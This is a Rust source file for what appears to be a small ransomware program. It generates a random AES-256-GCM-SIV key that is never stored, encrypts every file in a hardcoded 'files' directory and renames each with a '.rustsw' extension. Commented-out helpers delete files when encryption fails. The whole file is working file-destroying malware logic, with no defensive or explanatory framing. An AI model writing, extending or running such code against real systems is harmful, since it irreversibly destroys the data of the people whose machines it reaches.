mod encryption;
use aes_gcm_siv::aead::{Aead, NewAead};
use aes_gcm_siv::{Aes256GcmSiv, Key, Nonce};
use encryption::encryptor;
use encryption::key_gen;
use fs_extra;
use rand::prelude::*;
use rand_hc::Hc128Rng;
use std::fs;
use std::path;

const ENCRYPTED_EXTENSION: &str = ".rustsw";

fn main() {
    let mut key_gen = key_gen::KeyGen::from(Hc128Rng::from_entropy());

    let key_bytes = key_gen.gen_key_bytes();
    let nonce_bytes = key_gen.gen_nonce_bytes();

    let encryptor = encryptor::Encryptor::from(key_bytes, nonce_bytes);

    encrypt_dir(&String::from("files"), &encryptor);
    //encrypt_files_in_dir(files, encryptor);
}

fn encrypt_dir(dir: &String, encryptor: &encryptor::Encryptor) -> bool {
    let files = match fs_extra::dir::get_dir_content(&dir) {
        Ok(content) => content.files,
        Err(_) => return false,
    };

    encrypt_files(&files, encryptor);
    true
}

fn encrypt_files(files: &Vec<String>, encryptor: &encryptor::Encryptor) {
    for file in files {
        println!("Name: {}", &file);
        encryptor.encrypt_file_else_delete(&file);

        match fs::rename(&file, String::from(file) + ENCRYPTED_EXTENSION) {
            Ok(_) => (),
            Err(_) => (),
        };
    }
}

/*
fn encrypt(plain_text: &Vec<u8>) -> Vec<u8> {
    let mut rng = Hc128Rng::from_entropy();
    let mut key_bytes: [u8; 32] = [0; 32];
    let mut nonce_bytes: [u8; 12] = [0; 12];
    rng.fill_bytes(&mut key_bytes);
    rng.fill_bytes(&mut nonce_bytes);

    let key = Key::from_slice(&key_bytes);
    let cipher = Aes256GcmSiv::new(key);
    let nonce = Nonce::from_slice(&nonce_bytes);

    match cipher.encrypt(&nonce, plain_text.as_ref()) {
        Ok(encrypted_text) => encrypted_text,
        Err(_) => vec![],
    }
}

fn encrypt_file(path: &path::PathBuf) {
    let bytes_to_encrypt = match fs::read(&path) {
        Ok(bytes) => bytes,
        Err(_) => {
            attempt_delete_file(&path);
            return;
        }
    };
    let bytes_encrypted = encrypt(&bytes_to_encrypt);

    match fs::write(&path, bytes_encrypted) {
        Ok(_) => (),
        Err(_) => {
            attempt_delete_file(&path);
        }
    };
}

fn attempt_delete_file(path: &path::PathBuf) {
    match fs::remove_file(path) {
        Ok(_) => (),
        Err(_) => (),
    };
}
*/
